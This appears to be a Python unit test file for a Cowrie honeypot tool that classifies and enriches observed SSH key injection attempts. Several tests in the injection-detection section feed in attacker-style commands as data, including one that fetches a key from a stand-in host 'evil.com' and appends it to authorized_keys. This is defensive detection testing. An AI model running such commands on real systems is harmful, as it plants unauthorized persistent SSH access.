"""Unit tests for SSH key enrichment CLI (cowrie-enrich-ssh-keys)."""

from __future__ import annotations

import argparse
from datetime import UTC, datetime, timedelta
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Generator
from unittest.mock import Mock, patch

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session, sessionmaker

from cowrieprocessor.cli.enrich_ssh_keys import (
    _detect_injection_method,
    _escape_like,
    _normalize_event_timestamp,
    _parse_date,
    backfill_ssh_keys,
    main,
)
from cowrieprocessor.db.base import Base


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Create temporary directory."""
    with TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def test_db(temp_dir: Path) -> sessionmaker[Session]:
    """Create test database with schema."""
    db_path = temp_dir / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)

    SessionMaker = sessionmaker(bind=engine)
    return SessionMaker


class TestParseDateHelper:
    """Test _parse_date helper function."""

    def test_parse_date_valid(self) -> None:
        """Test parsing valid date string.

        Given: A valid YYYY-MM-DD date string
        When: Calling _parse_date
        Then: Should return timezone-aware UTC datetime
        """
        result = _parse_date("2025-10-25")

        assert isinstance(result, datetime)
        assert result.year == 2025
        assert result.month == 10
        assert result.day == 25
        assert result.tzinfo == UTC

    def test_parse_date_with_leading_zeros(self) -> None:
        """Test parsing date with leading zeros.

        Given: Date string with leading zeros in month/day
        When: Calling _parse_date
        Then: Should parse correctly
        """
        result = _parse_date("2025-01-01")

        assert result.year == 2025
        assert result.month == 1
        assert result.day == 1

    def test_parse_date_invalid_format(self) -> None:
        """Test parsing invalid date format.

        Given: Date string in wrong format
        When: Calling _parse_date
        Then: Should raise ArgumentTypeError
        """
        with pytest.raises(argparse.ArgumentTypeError) as exc_info:
            _parse_date("2025/10/25")  # Wrong separator

        assert "Invalid date format" in str(exc_info.value)
        assert "Use YYYY-MM-DD" in str(exc_info.value)

    def test_parse_date_invalid_values(self) -> None:
        """Test parsing invalid date values.

        Given: Date string with invalid month value
        When: Calling _parse_date
        Then: Should raise ArgumentTypeError
        """
        with pytest.raises(argparse.ArgumentTypeError):
            _parse_date("2025-13-01")  # Invalid month

    def test_parse_date_non_date_string(self) -> None:
        """Test parsing non-date string.

        Given: Completely invalid date string
        When: Calling _parse_date
        Then: Should raise ArgumentTypeError
        """
        with pytest.raises(argparse.ArgumentTypeError):
            _parse_date("not-a-date")


class TestEscapeLikeHelper:
    """Test _escape_like SQL escaping helper."""

    def test_escape_like_backslash(self) -> None:
        """Test escaping backslashes.

        Given: String containing backslash
        When: Calling _escape_like
        Then: Should escape backslash
        """
        result = _escape_like(r"C:\path\to\file")
        assert result == r"C:\\path\\to\\file"

    def test_escape_like_percent(self) -> None:
        """Test escaping percent signs.

        Given: String containing percent signs
        When: Calling _escape_like
        Then: Should escape percent signs
        """
        result = _escape_like("test%pattern")
        assert result == r"test\%pattern"

    def test_escape_like_underscore(self) -> None:
        """Test escaping underscores.

        Given: String containing underscores
        When: Calling _escape_like
        Then: Should escape underscores
        """
        result = _escape_like("test_pattern")
        assert result == r"test\_pattern"

    def test_escape_like_combined(self) -> None:
        """Test escaping multiple special characters.

        Given: String with backslash, percent, and underscore
        When: Calling _escape_like
        Then: Should escape all special characters
        """
        result = _escape_like(r"test\%_pattern")
        assert result == r"test\\\%\_pattern"

    def test_escape_like_normal_string(self) -> None:
        """Test with normal string (no special characters).

        Given: String without special characters
        When: Calling _escape_like
        Then: Should return unchanged string
        """
        result = _escape_like("normalstring")
        assert result == "normalstring"


class TestNormalizeEventTimestamp:
    """Test _normalize_event_timestamp helper."""

    def test_normalize_none(self) -> None:
        """Test normalizing None timestamp.

        Given: None as timestamp
        When: Calling _normalize_event_timestamp
        Then: Should return None
        """
        result = _normalize_event_timestamp(None)
        assert result is None

    def test_normalize_naive_datetime(self) -> None:
        """Test normalizing naive datetime.

        Given: Naive datetime (no timezone)
        When: Calling _normalize_event_timestamp
        Then: Should add UTC timezone
        """
        naive_dt = datetime(2025, 10, 25, 12, 0, 0)
        result = _normalize_event_timestamp(naive_dt)

        assert result is not None
        assert result.tzinfo == UTC
        assert result.year == 2025
        assert result.month == 10
        assert result.day == 25

    def test_normalize_utc_datetime(self) -> None:
        """Test normalizing UTC datetime.

        Given: Datetime already in UTC
        When: Calling _normalize_event_timestamp
        Then: Should return as-is
        """
        utc_dt = datetime(2025, 10, 25, 12, 0, 0, tzinfo=UTC)
        result = _normalize_event_timestamp(utc_dt)

        assert result == utc_dt
        assert result.tzinfo == UTC

    def test_normalize_non_utc_timezone(self) -> None:
        """Test normalizing datetime in non-UTC timezone.

        Given: Datetime in non-UTC timezone
        When: Calling _normalize_event_timestamp
        Then: Should convert to UTC
        """
        # Create a datetime with a non-UTC timezone offset
        from datetime import timezone

        eastern = timezone(timedelta(hours=-5))
        eastern_dt = datetime(2025, 10, 25, 12, 0, 0, tzinfo=eastern)

        result = _normalize_event_timestamp(eastern_dt)

        assert result is not None
        assert result.tzinfo == UTC
        # Should be 5 hours ahead (converted from EST to UTC)
        assert result.hour == 17


class TestDetectInjectionMethod:
    """Test _detect_injection_method helper."""

    def test_detect_echo_append(self) -> None:
        """Test detecting echo with append redirection.

        Given: Command using 'echo' and '>>'
        When: Calling _detect_injection_method
        Then: Should return 'echo_append'
        """
        command = "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
        result = _detect_injection_method(command)
        assert result == "echo_append"

    def test_detect_echo_redirect(self) -> None:
        """Test detecting echo with simple redirection.

        Given: Command using 'echo' and '>'
        When: Calling _detect_injection_method
        Then: Should return 'echo_redirect'
        """
        command = "echo 'ssh-rsa AAAA...' > ~/.ssh/authorized_keys"
        result = _detect_injection_method(command)
        assert result == "echo_redirect"

    def test_detect_printf(self) -> None:
        """Test detecting printf command.

        Given: Command using 'printf'
        When: Calling _detect_injection_method
        Then: Should return 'printf'
        """
        command = "printf 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
        result = _detect_injection_method(command)
        assert result == "printf"

    def test_detect_heredoc(self) -> None:
        """Test detecting heredoc syntax.

        Given: Command using cat with '<<'
        When: Calling _detect_injection_method
        Then: Should return 'heredoc'
        """
        command = "cat << EOF >> ~/.ssh/authorized_keys\nssh-rsa AAAA...\nEOF"
        result = _detect_injection_method(command)
        assert result == "heredoc"

    def test_detect_base64(self) -> None:
        """Test detecting base64 decoding.

        Given: Command using base64 decode (without echo)
        When: Calling _detect_injection_method
        Then: Should return 'base64_decode'
        """
        # Note: echo is checked before base64, so use command without echo
        command = "base64 -d /tmp/key.txt | tee -a ~/.ssh/authorized_keys"
        result = _detect_injection_method(command)
        assert result == "base64_decode"

    def test_detect_unknown(self) -> None:
        """Test detecting unknown injection method.

        Given: Command with no recognized pattern
        When: Calling _detect_injection_method
        Then: Should return 'unknown'
        """
        command = "wget http://evil.com/key.pub && cat key.pub >> ~/.ssh/authorized_keys"
        result = _detect_injection_method(command)
        assert result == "unknown"

    def test_detect_case_insensitive(self) -> None:
        """Test that detection is case-insensitive.

        Given: Command with uppercase 'ECHO'
        When: Calling _detect_injection_method
        Then: Should still detect as echo_append
        """
        command = "ECHO 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
        result = _detect_injection_method(command)
        assert result == "echo_append"


class TestMainCLIParsing:
    """Test main() function and CLI argument parsing."""

    def test_main_no_command(self, capsys: pytest.CaptureFixture[str]) -> None:
        """Test main with no command provided.

        Given: No command line arguments
        When: Calling main
        Then: Should print help and return exit code 1
        """
        with patch('sys.argv', ['cowrie-enrich-ssh-keys']):
            result = main()

        assert result == 1
        captured = capsys.readouterr()
        assert "Enrich Cowrie sessions with SSH key intelligence" in captured.out

    @patch('cowrieprocessor.cli.enrich_ssh_keys.backfill_ssh_keys')
    def test_main_backfill_command(self, mock_backfill: Mock) -> None:
        """Test main with backfill command.

        Given: Backfill command with days-back argument
        When: Calling main
        Then: Should call backfill_ssh_keys function
        """
        mock_backfill.return_value = 0

        with patch('sys.argv', ['cowrie-enrich-ssh-keys', 'backfill', '--days-back', '30']):
            result = main()

        assert result == 0
        mock_backfill.assert_called_once()
        args = mock_backfill.call_args[0][0]
        assert args.command == 'backfill'
        assert args.days_back == 30

    @patch('cowrieprocessor.cli.enrich_ssh_keys.export_ssh_keys')
    def test_main_export_command(self, mock_export: Mock) -> None:
        """Test main with export command.

        Given: Export command with format argument
        When: Calling main
        Then: Should call export_ssh_keys function
        """
        mock_export.return_value = 0

        with patch('sys.argv', ['cowrie-enrich-ssh-keys', 'export', '--format', 'json']):
            result = main()

        assert result == 0
        mock_export.assert_called_once()
        args = mock_export.call_args[0][0]
        assert args.command == 'export'
        assert args.format == 'json'

    @patch('cowrieprocessor.cli.enrich_ssh_keys.repair_ssh_key_timestamps')
    def test_main_repair_command(self, mock_repair: Mock) -> None:
        """Test main with repair-timestamps command.

        Given: Repair-timestamps command
        When: Calling main
        Then: Should call repair_ssh_key_timestamps function
        """
        mock_repair.return_value = 0

        with patch('sys.argv', ['cowrie-enrich-ssh-keys', 'repair-timestamps']):
            result = main()

        assert result == 0
        mock_repair.assert_called_once()

    def test_main_backfill_missing_end_date(self, capsys: pytest.CaptureFixture[str]) -> None:
        """Test backfill with start-date but missing end-date.

        Given: Backfill command with start-date but no end-date
        When: Calling main
        Then: Should raise error
        """
        with patch('sys.argv', ['cowrie-enrich-ssh-keys', 'backfill', '--start-date', '2025-01-01']):
            with pytest.raises(SystemExit) as exc_info:
                main()

        assert exc_info.value.code == 2  # argparse error code
        captured = capsys.readouterr()
        assert "--end-date is required" in captured.err


class TestBackfillSSHKeys:
    """Test backfill_ssh_keys command function."""

    @patch('cowrieprocessor.cli.enrich_ssh_keys.resolve_database_settings')
    @patch('cowrieprocessor.cli.enrich_ssh_keys.create_engine_from_settings')
    @patch('cowrieprocessor.cli.enrich_ssh_keys.apply_migrations')
    def test_backfill_old_schema_version(
        self,
        mock_migrations: Mock,
        mock_engine: Mock,
        mock_settings: Mock,
    ) -> None:
        """Test backfill with incompatible schema version.

        Given: Database with schema v10 (< v11 required)
        When: Running backfill
        Then: Should return 1 (error)
        """
        mock_settings.return_value = {"database_url": "sqlite:///test.db"}
        mock_migrations.return_value = 10  # Old schema

        args = argparse.Namespace(
            days_back=7,
            sensor=None,
            status_dir=None,
            batch_size=100,
            progress=False,
            verbose=False,
        )

        result = backfill_ssh_keys(args)

        assert result == 1


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
